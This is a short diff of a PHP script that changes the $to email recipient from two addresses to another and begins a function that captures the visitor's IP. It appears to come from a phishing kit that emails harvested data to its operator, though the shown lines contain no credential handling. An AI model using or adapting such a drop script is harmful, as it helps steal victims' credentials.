@@ -1,5 +1,5 @@
 <?php
-$to = "jemmybtc1993@gmail.com,btcdibi@zoho.com";
+$to = "frgrass10@gmail.com";
 function getRealIpAddr()
 {
 if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
